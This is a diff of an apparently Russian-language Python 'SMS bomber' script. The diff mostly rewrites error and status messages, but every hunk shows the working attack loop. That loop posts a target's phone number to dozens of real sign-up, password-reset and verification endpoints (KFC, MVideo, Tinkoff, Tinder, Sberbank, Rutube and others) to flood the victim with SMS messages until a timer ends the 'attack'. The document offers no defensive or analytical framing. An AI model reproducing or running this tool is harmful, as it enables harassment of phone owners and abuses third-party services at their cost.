@@ -8332,10 +8332,10 @@ if call == str(2):
             print('[+] PizzaHut отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
@@ -8343,10 +8343,10 @@ if call == str(2):
             print('[+] Rabota отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -8357,7 +8357,7 @@ if call == str(2):
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
@@ -8365,10 +8365,10 @@ if call == str(2):
             print('[+] Citilink отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -8377,10 +8377,10 @@ if call == str(2):
             print('[+] Smsint отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -8389,10 +8389,10 @@ if call == str(2):
             print('[+] oyorooms отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -8402,10 +8402,10 @@ if call == str(2):
             print('[+] MVIDEO отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -8415,10 +8415,10 @@ if call == str(2):
             print('[+] newnext отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
@@ -8426,10 +8426,10 @@ if call == str(2):
             print('[+] Sunlight отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -8439,10 +8439,10 @@ if call == str(2):
             print('[+] alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
@@ -8450,10 +8450,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -8463,10 +8463,10 @@ if call == str(2):
             print('[+] Sberbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -8479,10 +8479,10 @@ if call == str(2):
             print('[+] Psbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
@@ -8490,10 +8490,10 @@ if call == str(2):
             print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
@@ -8501,10 +8501,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
@@ -8512,10 +8512,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
@@ -8523,10 +8523,10 @@ if call == str(2):
             print('[+] Yandex.Chef отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -8535,10 +8535,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -8547,14 +8547,14 @@ if call == str(2):
             print('[+] Delitime отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -8563,10 +8563,10 @@ if call == str(2):
             print('[+] Guru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -8576,10 +8576,10 @@ if call == str(2):
             print('[+] ICQ отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -8589,10 +8589,10 @@ if call == str(2):
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -8601,10 +8601,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -8612,10 +8612,10 @@ if call == str(2):
             print('[+] Pmsm отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
@@ -8623,10 +8623,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
@@ -8634,10 +8634,10 @@ if call == str(2):
             print('[+] Lenta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -8646,10 +8646,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -8659,10 +8659,10 @@ if call == str(2):
             print('[+] MVideo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -8671,10 +8671,10 @@ if call == str(2):
             print('[+] OK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
@@ -8682,10 +8682,10 @@ if call == str(2):
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
@@ -8695,10 +8695,10 @@ if call == str(2):
             print('[+] Qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
@@ -8706,10 +8706,10 @@ if call == str(2):
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -8717,25 +8717,25 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
             R = R + 1
             print('[+] RuTaxi отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -8743,55 +8743,55 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
             R = R + 1
             print('[+] Tinkoff отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
             R = R + 1
             print('[+] MTS отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -8800,22 +8800,22 @@ if call == str(2):
             R = R + 1
             print('[+] PizzaHut отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -8827,7 +8827,7 @@ if call == str(2):
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -8835,11 +8835,11 @@ if call == str(2):
             R = R + 1
             print('[+] Smsint отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -8847,11 +8847,11 @@ if call == str(2):
             R = R + 1
             print('[+] oyorooms отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post(
@@ -8862,11 +8862,11 @@ if call == str(2):
             R = R + 1
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -8875,22 +8875,22 @@ if call == str(2):
             R = R + 1
             print('[+] newnext отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -8899,22 +8899,22 @@ if call == str(2):
             R = R + 1
             print('[+] alpari отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -8923,11 +8923,11 @@ if call == str(2):
             R = R + 1
             print('[+] Sberbank отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -8939,44 +8939,44 @@ if call == str(2):
             R = R + 1
             print('[+] Psbank отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
             R = R + 1
             print('[+] Beltelcom отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] KFC отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.carsmile.com/",
@@ -8985,22 +8985,22 @@ if call == str(2):
             R = R + 1
             print('[+] carsmile отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -9008,11 +9008,11 @@ if call == str(2):
             R = R + 1
             print('[+] Delitime отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -9020,11 +9020,11 @@ if call == str(2):
             R = R + 1
             print('[+] Guru отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -9033,11 +9033,11 @@ if call == str(2):
             R = R + 1
             print('[+] ICQ отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -9046,11 +9046,11 @@ if call == str(2):
             R = R + 1
             print('[+] InDriver отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -9058,33 +9058,33 @@ if call == str(2):
             R = R + 1
             print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
